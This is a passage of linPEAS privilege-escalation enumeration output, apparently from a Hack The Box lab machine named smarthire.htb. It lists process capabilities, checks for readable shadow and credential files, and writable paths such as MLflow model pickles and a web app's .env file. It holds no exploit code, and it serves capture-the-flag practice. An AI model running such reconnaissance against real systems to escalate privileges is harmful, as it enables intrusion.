  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 80 (kintegrityd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 81 (kblockd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 82 (blkcg_punt_bio) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 83 (tpm_dev_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 84 (ata_sff) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 85 (md) user=root
  CapInh: 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper [1;31mcap_net_bind_service[0m,cap_net_admin=ep
/usr/bin/mtr-packet [1;31mcap_net_raw[0m=ep
/usr/bin/ping [1;31mcap_net_raw[0m=ep

[1;34m╔══════════╣ [1;32mUsers with capabilities [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
[0m
[1;34m╚ [1;34m[3mChecking if PAM loads pam_cap.so
[0m/etc/pam.d/common-auth:25:auth	optional			[1;31;103mpam_cap.so[0m 

[1;34m╔══════════╣ [1;32mChecking misconfigurations of ld.so [1;90m(T1574.006)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
[0m[1;32m[3m/etc/ld.so.conf
[0mContent of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

[1;32m[3m/etc/ld.so.conf.d
[0m[1;32m[3m  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
[0m[3m  - [1;32m/usr/lib/x86_64-linux-gnu/libfakeroot[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/libc.conf
[0m[3m  - [1;32m/usr/local/lib[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
[0m[3m  - [1;32m/lib/x86_64-linux-gnu[0m[0m
[3m  - [1;32m/usr/lib/x86_64-linux-gnu[0m[0m

[3m[1;32m/etc/ld.so.preload
[0m[1;34m╔══════════╣ [1;32mFiles (scripts) in /etc/profile.d/ [1;90m(T1546.004)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
[0mtotal 24
drwxr-xr-x   2 root root 4096 Sep 19  2025 .
drwxr-xr-x 106 root root 4096 May 13 16:14 ..
-rw-r--r--   1 root root   96 Oct 15  2021 [1;32m01-locale-fix.sh[0m
-rw-r--r--   1 root root  726 Nov 15  2021 [1;32mbash_completion.sh[0m
-rw-r--r--   1 root root 1107 Aug 17  2023 [1;32mgawk.csh[0m
-rw-r--r--   1 root root  757 Aug 17  2023 [1;32mgawk.sh[0m

[1;34m╔══════════╣ [1;32mPermissions in init, init.d, systemd, and rc.d [1;90m(T1543.002)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd
[0m
[1;34m╔══════════╣ [1;32mAppArmor binary profiles [1;90m(T1518.001)
[0m-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
-rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd

[1;34m═╣ [1;32mHashes inside passwd file? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mWritable passwd file? ................ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCredentials in fstab/mtab? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow files? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow plists? ............ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write shadow plists? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read opasswd file? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write in network-scripts? ...... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read root folder? .............. [0m[1;90mNo
[0m
[1;34m╔══════════╣ [1;32mSearching root files in home dirs (limit 30) [1;90m(T1083)
[0m/home/
/home/[1;96m[1;31msvcweb[0m[0m/user.txt
/home/[1;96m[1;31msvcweb[0m[0m/.python_history
/root/
/var/www
/var/www/smarthire.htb/app.py
/var/www/smarthire.htb/utils/functions.py
/var/www/html
/var/www/html/index.nginx-debian.html

[1;34m╔══════════╣ [1;32mSearching folders owned by me containing others files on it (limit 100) [1;90m(T1083)
[0m-rw-r----- 1 [1;13mroot[0m [1;96m[1;95msvcweb[0m[0m 33 Jul  2 02:36 /home/[1;96m[1;95msvcweb[0m[0m/user.txt
-rw-r--r-- 1 [1;13mroot[0m [1;13mroot[0m 11416 Sep 20  2025 /var/[1;32mwww[0m/smarthire.htb/app.py

[1;34m╔══════════╣ [1;32mReadable files belonging to root and readable by me but not world readable [1;90m(T1083)
[0m-rw-r----- 1 root svcweb 33 Jul  2 02:36 [1;31m/home/svcweb/user.txt[0m

[1;34m╔══════════╣ [1;32mInteresting writable files owned by me or writable by everyone (not in Home) (max 200) [1;90m(T1574.009,T1574.010)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
[0m/home/svcweb
/opt/mlflow/app
/opt/mlflow/app/basic_auth.db
/opt/mlflow/app/mlartifacts
/opt/mlflow/app/mlartifacts/0
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/conda.yaml
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/metadata
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/metadata/conda.yaml
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/metadata/MLmodel
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/metadata/python_env.yaml
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/metadata/requirements.txt
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/MLmodel
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/python_env.yaml
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/python_model.pkl
/opt/mlflow/app/mlartifacts/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts/model/requirements.txt
/opt/mlflow/app/mlruns
/opt/mlflow/app/mlruns/0
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/artifacts
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/meta.yaml
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/metrics
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/params
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags/mlflow.log-model.history
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags/mlflow.runName
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags/mlflow.source.name
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags/mlflow.source.type
/opt/mlflow/app/mlruns/0/2de5ebcd602247db8eac71d0d06a7ed7/tags/mlflow.user
/opt/mlflow/app/mlruns/0/meta.yaml
/opt/mlflow/app/mlruns/models
/opt/mlflow/app/mlruns/models/wipro-e5558e69d5aa-model
/opt/mlflow/app/mlruns/models/wipro-e5558e69d5aa-model/meta.yaml
/opt/mlflow/app/mlruns/models/wipro-e5558e69d5aa-model/version-2
/opt/mlflow/app/mlruns/models/wipro-e5558e69d5aa-model/version-2/meta.yaml
/opt/mlflow/app/mlruns/.trash
/opt/mlflow/app/mlruns/.trash/332422800738433451
/opt/mlflow/app/mlruns/.trash/332422800738433451/meta.yaml
/run/lock
/run/screen
/run/screen/S-svcweb
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas[1;31m.sh[0m
/tmp/linpeas.sh.1
/tmp/output.txt
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/tmp/tmp7kh0t2c9/conda.yaml
/tmp/tmp7kh0t2c9/metadata
/tmp/tmp7kh0t2c9/metadata/conda.yaml
/tmp/tmp7kh0t2c9/metadata/MLmodel
/tmp/tmp7kh0t2c9/metadata/python_env.yaml
/tmp/tmp7kh0t2c9/metadata/requirements.txt
/tmp/tmp7kh0t2c9/MLmodel
/tmp/tmp7kh0t2c9/python_env.yaml
/tmp/tmp7kh0t2c9/python_model.pkl
/tmp/tmp7kh0t2c9/registered_model_meta
/tmp/tmp7kh0t2c9/requirements.txt
/tmp/tmpn0_3ffyr
/tmp/tmpn0_3ffyr/conda.yaml
/tmp/tmpn0_3ffyr/metadata
/tmp/tmpn0_3ffyr/metadata/conda.yaml
/tmp/tmpn0_3ffyr/metadata/MLmodel
/tmp/tmpn0_3ffyr/metadata/python_env.yaml
/tmp/tmpn0_3ffyr/metadata/requirements.txt
/tmp/tmpn0_3ffyr/MLmodel
/tmp/tmpn0_3ffyr/python_env.yaml
/tmp/tmpn0_3ffyr/python_model.pkl
/tmp/tmpn0_3ffyr/registered_model_meta
/tmp/tmpn0_3ffyr/requirements.txt
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/tmp
/var/www/smarthire.htb
/var/www/smarthire.htb/config.py
/var/www/smarthire.htb/.env
/var/www/smarthire.htb/__pycache__
/var/www/smarthire.htb/__pycache__/app.cpython-310.pyc
/var/www/smarthire.htb/__pycache__/config.cpython-310.pyc
/var/www/smarthire.htb/__pycache__/wsgi.cpython-310.pyc
/var/www/smarthire.htb/requirements.txt
/var/www/smarthire.htb/smarthire.db
/var/www/smarthire.htb/static
/var/www/smarthire.htb/static/images
/var/www/smarthire.htb/static/js
/var/www/smarthire.htb/static/js/tailwind.js
/var/www/smarthire.htb/static/styles.css
/var/www/smarthire.htb/templates
/var/www/smarthire.htb/templates/base.html
/var/www/smarthire.htb/templates/dashboard.html
/var/www/smarthire.htb/templates/index.html
/var/www/smarthire.htb/templates/login.html
/var/www/smarthire.htb/templates/predict.html
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/var/www/smarthire.htb/utils
/var/www/smarthire.htb/utils/db_util.py
/var/www/smarthire.htb/utils/middleware.py
/var/www/smarthire.htb/utils/__pycache__
/var/www/smarthire.htb/utils/__pycache__/db_util.cpython-310.pyc
/var/www/smarthire.htb/utils/__pycache__/functions.cpython-310.pyc
/var/www/smarthire.htb/utils/__pycache__/middleware.cpython-310.pyc
/var/www/smarthire.htb/utils/__pycache__/simplehiringmodel.cpython-310.pyc
/var/www/smarthire.htb/utils/simplehiringmodel.py
/var/www/smarthire.htb/.venv
/var/www/smarthire.htb/.venv/bin
